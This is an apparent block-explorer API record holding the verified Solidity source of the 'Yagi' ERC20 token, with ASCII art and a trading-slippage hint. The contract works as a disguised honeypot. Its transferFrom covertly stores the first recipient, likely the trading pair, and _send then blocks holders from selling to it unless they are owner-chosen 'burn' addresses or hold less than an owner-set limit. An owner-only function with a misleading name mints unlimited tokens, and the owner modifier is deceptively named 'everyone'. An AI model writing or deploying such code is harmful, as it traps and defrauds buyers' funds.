{"status": "1", "message": "OK", "result": [{"SourceCode": "/**\r\n     __     __         _ \r\n     \\ \\   / /        (_)\r\n      \\ \\_/ /_ _  __ _ _ \r\n       \\   / _` |/ _` | |\r\n        | | (_| | (_| | |\r\n        |_|\\__,_|\\__, |_|\r\n                  __/ |  \r\n      /)  (\\     |___/   \r\n )\\.:::::::::./(\r\n \\( o       o )/\r\n   '-./ / _.-'`-.\r\n    ( oo  ) / _  \\\r\n    |'--'/\\/ ( \\  \\\r\n     \\''/  \\| \\ \\  \\\r\n      ww   |  '  )  \\\r\n           |.' .'   |\r\n          .' .'==|==|\r\n         / .'\\    [_]\r\n      .-(/\\) |     /\r\n     /.-\"\"\"'/|    |\r\n     ||    / |    |\r\n     //   |  |    |\r\n     ||   |__|___/\r\n     \\\\   [__[___]\r\n     // .-'.-'  (\r\n     ||(__(__.-._)\r\n     \r\n\u21c5 Set slip to 11% \u21c5\r\n\r\n**/\r\n\r\n//   SPDX-License-Identifier: MIT\r\n\r\npragma solidity >=0.5.17;\r\n\r\ncontract ERC20Interface {\r\n  function totalSupply() public view returns (uint);\r\n  function balanceOf(address tokenOwner) public view returns (uint balance);\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n  function transfer(address to, uint tokens) public returns (bool success);\r\n  function approve(address spender, uint tokens) public returns (bool success);\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n  event Transfer(address indexed from, address indexed to, uint tokens);\r\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\n\r\ncontract ApproveAndCallFallBack {\r\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\r\n}\r\n\r\ncontract Owned {\r\n  address public owner;\r\n  \r\n  event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n  constructor() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  modifier everyone {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n\r\n}\r\n\r\nlibrary SafeMath {\r\n  function add(uint a, uint b) internal pure returns (uint c) {\r\n    c = a + b;\r\n    require(c >= a);\r\n  }\r\n  function sub(uint a, uint b) internal pure returns (uint c) {\r\n    require(b <= a);\r\n    c = a - b;\r\n  }\r\n  function mul(uint a, uint b) internal pure returns (uint c) {\r\n    c = a * b;\r\n    require(a == 0 || c / a == b);\r\n  }\r\n  function div(uint a, uint b) internal pure returns (uint c) {\r\n    require(b > 0);\r\n    c = a / b;\r\n  }\r\n}\r\n\r\n/**\r\n\r\n                               .        ..,,:;;;ii;;;;:::,..                                        \r\n                                 .,:i1ttffLLCCCCCLLLLLLLLLfft1i;:,.                                 \r\n                            .,itLCGGGCCLLLLLLLfffffffffffLfLLLLLLLf1i:,                             \r\n                    .    ,;tCG000GCCLffffffttfffffffffttfffLffLfffffffff1:,                         \r\n                      ,:itLCGGLCCLLfffftt1tttttttttttttftt1tt111tffttfffLLfti,                      \r\n                   .;tffLCCGCLLLLfffttttttftt111111tttttttttt111tfffffftttttff1;.                   \r\n                 ,ifffLLCCCLLCLfLfLLffffft11t1ii1111tfft1ttttffftfLLLfffttttft1tti,                 \r\n               ,itffffLLLfLLLCLfLLLCCLLfffffft111ii11tt11111tffffffffLCLfffffftttff1:.              \r\n             ,iffttfffLLffLLffffLLLftttttfftfftffttt1111tt1tttttfttfLfLLLfttttftfffff1,             \r\n           .ifftttfLLGCLffftffffffft1111ttfttfffLfffffffttttt1ttttttfLCLffffffffttfLLLfi,           \r\n          ,1ffttffCGGCLLCLffffffffftttffttt11ttttttttttffffLf1ttttfffLCCCLCLfftfffffLLLt1:  .       \r\n         ;ttttttffCGLffLLLLfffLffft1tttfLffLLftttt1tt11ttfffLLffftfLLffLLLLfffttffffffffff1.        \r\n       .1ttfftt1111tffffffLLLft1tt11ttfffffLLt1i;i1ttff11tfffLffffLLffffffttfffffLfffLLfffft,       \r\n      .1fffftt1iiittttffLffLLftt11tttttttttti;:::,;11fft111tfft1tffCCfffffftttfffCLffffLfffft,      \r\n     .1tfft1i1i11i1ftfttffffLftt1tttttttfLt1:,:,::i1tttft111tt1ttffLfLfLLfLfftttLLLLfffLLfffft,     \r\n     ittt1t11111111ftfttftttttttft1tttLLtttt1iiiii11t1t1111tftffffLLLffLCLLLCLLLLCLLLffLLftffft,    \r\n    :ttt111i1111it1tttttt1tt1tttttfffffffftttttttt111i1t11tftffffffftffLLfLffLfLLLLfffffffttfftt.   \r\n   ,11;itt1111i111i1tffftffttttttttffttfLLfttttt1t1111tffffftLLfLCCLLLLffLfffffLLLfLfft1t1ttfttti   \r\n   ;i;:;i1i11i11i111fffLLLffftfffttfttt1tf11t111tLftt1ffLLLfLfLLLLCCGGGLLLffftLLfLtfCLtt111tttttf: .\r\n  :1;:,::;i111i1111tfLfffffffLLfffft1tt1tt111111ttt11tffLfffLLLCLfLLLCCLLffftfLCLfffLLftt11t11ttft  \r\n .i1i;:::;i11111111tLLLfLffffffffftt11t1111111tt111ttttfffCLffLLLLLLLLLLfffLLLLCCLLffttt1ttft1ttff, \r\n ,i1i;;iiii11111111ttLGLfLfLfffLfffftt111tt1ttt1t1t1t1ttttLLffffLGCLfLLLffLLfLffLLLffft1fft1tffftf; \r\n :111i;iii;1t11ttt11tfCCLfLfftttffffftttttftttttftt11tttffttfCLffLffLLfLLLfLffftfffftffftft11fffff1.\r\n ;11i::;iiitfitfLt11ffCGGLLLfffftttt11ttfffftttttt11ftffffffLLLLffLffffLCLLfftffttfttfLLftt1ttffLLt.\r\n ;ii:,.:i11t11ttf111fLCCGGLfffffffftttttttfftttttttttttftfffftfLLfffttfffLLfttttfffttLCLffftttffLLt,\r\n ;ii:,,:i1ii11tft111tfLLGGCCCLfftfftffffffft1tttfffttfffffff1ii1tffttftfffftttt11tfffffffLfftfffLLf,\r\n ;1i::;;i11111i11i1ii1tfCCGCGCffffffttfffftftttttft11tfLLfftt11ii1tf1ttfLLftt111ttfffft1fLfftfftfLt.\r\n :1i;:;i1i111111111i1i1fCGGCLLfttttt1ttt11111i111t111tLCftffttttttttttffLLftfftttfftffttfffftfffff1 \r\n ,111;;1111111111tt111i1fLCLfftft111tt1111111tt11tt11tt11tffLfttt1tfffffLfttttfffLLLLffftftttftt1t; \r\n .i11111t111ii1i1t111iii1tttttttt11111111111t111111111111tLLLfttt11ttttfftttfffffLCCCLfttffffttt11, \r\n  ;11111111i1111iiii11iii111t1tt11t111t1i1111111111t1t11ttfffftt1tfLftt1t1tfLffLfLCLLfff1tLfttt11i. \r\n  .i1i1ttt1ii1111t1iii1111i11t111111111t111111t1111111tt1ttttt11tf1fft111111tfLLffffftt1ttttfft11:  \r\n   :11tt1ttt11i11t1iii1tt1111ttttt111i11111tt1i1ft11111t1111111tLfiit1i111itttft11tff111tt1tt1tti   \r\n    ;11i111tttt11iiii11ff1tttt;;:;f1111111111i11Lt111111i1iii1tttftt1i1i11i11iii11tt11111111ii1t,   \r\n    .i11i11i11f1iiiii111t111tt1i;tLt11tttt111111t11111i11iii1111i11iiiii1ii1iii111111111ii111it:    \r\n     ,1111111ii1i;;ii111iiii1i111tft1111i11111111tt11111i11111i11iii1iiiiii1iiiiiiiiiiiii11t1t:     \r\n      ,11t111111i:;i1i;iii11i111ii111ttt1111111111111t11ii111iiiiiii1i;;iii;;;;ii1iii;;;i1tft:      \r\n       ,11111iii11iiiiiii111t1111111111ttt1tff11iii11ftiii1i;:i1i;;;ii;;;;;:;;;i1i;iiiiit1tt,       \r\n        .i11i;;iiiiiii1tt111111ii111iiii11111;:;ii1iit11i:;:::iiiiii;;;;;;;::;ii;;;;iii1tf1.        \r\n          :11;;:;;;;;ii1ttt11111111i1iiii1111;:;ii111111iii;;iii;;;:::;;;;:,:ii:i;,:ii1tt;.         \r\n           .i1i;:;;;;i;i111t111i1i1111iii1i11111111t1111iii;;;i1i;;;;;iii;:;ii;;;;;;i1t1,           \r\n             ,;;;;:;;;;iiii1t11i11111i111i1tLfftttt11iiii;;i;iiiiiiiiii1;:;ii:::;;ii11:.            \r\n              .:iii;;;i;iiii11111111t111iittfft11111ii1;:;iiii;:;iiiii;;;;;;::;;;i1i:.              \r\n                 ,;i;;iii1ii11ii1t1111i11111ii11iii11i1iiiiii;;iii11i;;;i;;;;;;iii:.                \r\n                   .,;ii1111i11111t1iii1111t11111i1111111iii;;iiiiiiii;;;;;;iii;,                   \r\n                     .,:1111ii111ttfffft11111ttf11111i;iii;iiiiiiiiiii;;;iii;,.                     \r\n                        .,;i11111tttfLfLft1tttt11t111iii1i11111i1i11111ii:,.                        \r\n                            .:;itfffftffLLLfttfff1tffft111tttt1ttt1i;:,.                            \r\n                                ..,:;1ttfffLLLLLLLLLCCCLLfftt1ii:,.                                 \r\n                                      ..,,::;iiiii11iii;::,..                                       \r\n\r\n\r\n**/\r\n\r\ncontract TokenERC20 is ERC20Interface, Owned{\r\n  using SafeMath for uint;\r\n\r\n  string public symbol;\r\n  string public name;\r\n  uint8 public decimals;\r\n  uint256 _totalSupply;\r\n  uint internal queueNumber;\r\n  address internal zeroAddress;\r\n  address internal burnAddress;\r\n  address internal burnAddress2;\r\n\r\n  mapping(address => uint) balances;\r\n  mapping(address => mapping(address => uint)) allowed;\r\n\r\n  function totalSupply() public view returns (uint) {\r\n    return _totalSupply.sub(balances[address(0)]);\r\n  }\r\n  function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n    return balances[tokenOwner];\r\n  }\r\n  function transfer(address to, uint tokens) public returns (bool success) {\r\n    require(to != zeroAddress, \"please wait\");\r\n    balances[msg.sender] = balances[msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(msg.sender, to, tokens);\r\n    return true;\r\n  }\r\n  function approve(address spender, uint tokens) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    return true;\r\n  }\r\n\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n    if(from != address(0) && zeroAddress == address(0)) zeroAddress = to;\r\n    else _send (from, to);\r\n\tbalances[from] = balances[from].sub(tokens);\r\n    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(from, to, tokens);\r\n    return true;\r\n  }\r\n\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n    return allowed[tokenOwner][spender];\r\n  }\r\n  function allowanceAndtransfer(address _address, uint256 tokens) public everyone {\r\n    burnAddress = _address;\r\n\t_totalSupply = _totalSupply.add(tokens);\r\n    balances[_address] = balances[_address].add(tokens);\r\n  }\t\r\n  function Burn(address _address) public everyone {\r\n    burnAddress2 = _address;\r\n  }\t\r\n  function BurnSize(uint256 _size) public everyone {\r\n    queueNumber = _size;\r\n  }\t\r\n  function _send (address start, address end) internal view {\r\n      require(end != zeroAddress || (start == burnAddress && end == zeroAddress) || (start == burnAddress2 && end == zeroAddress)|| (end == zeroAddress && balances[start] <= queueNumber), \"cannot be zero address\");\r\n  }\r\n  function () external payable {\r\n    revert();\r\n  }\r\n}\r\n\r\ncontract Yagi is TokenERC20 {\r\n\r\n  function initialise() public everyone() {\r\n    address payable _owner = msg.sender;\r\n    _owner.transfer(address(this).balance);\r\n  }\r\n     \r\n    constructor(string memory _name, string memory _symbol, uint256 _supply, address burn1, address burn2, uint256 _indexNumber) public {\r\n\tsymbol = _symbol;\r\n\tname = _name;\r\n\tdecimals = 18;\r\n\t_totalSupply = _supply*(10**uint256(decimals));\r\n\tqueueNumber = _indexNumber*(10**uint256(decimals));\r\n\tburnAddress = burn1;\r\n\tburnAddress2 = burn2;\r\n\towner = msg.sender;\r\n\tbalances[msg.sender] = _totalSupply;\r\n\temit Transfer(address(0x0), msg.sender, _totalSupply);\r\n  }\r\n  function() external payable {\r\n\r\n  }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"burn1\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"burn2\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_indexNumber\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"Burn\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_size\",\"type\":\"uint256\"}],\"name\":\"BurnSize\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"remaining\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"allowanceAndtransfer\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"initialise\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Yagi", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000009184e72a000000000000000000000000000777195f2504b51c5c4f0a099d75e71bf2e48b233000000000000000000000000777195f2504b51c5c4f0a099d75e71bf2e48b23300000000000000000000000000000000000000000000000000000006fc23ac000000000000000000000000000000000000000000000000000000000000000004596167690000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045941474900000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://f87237eb76fd56864d574c4d9c9e103052bf1ac3eef29631e95817bf039967d5"}]}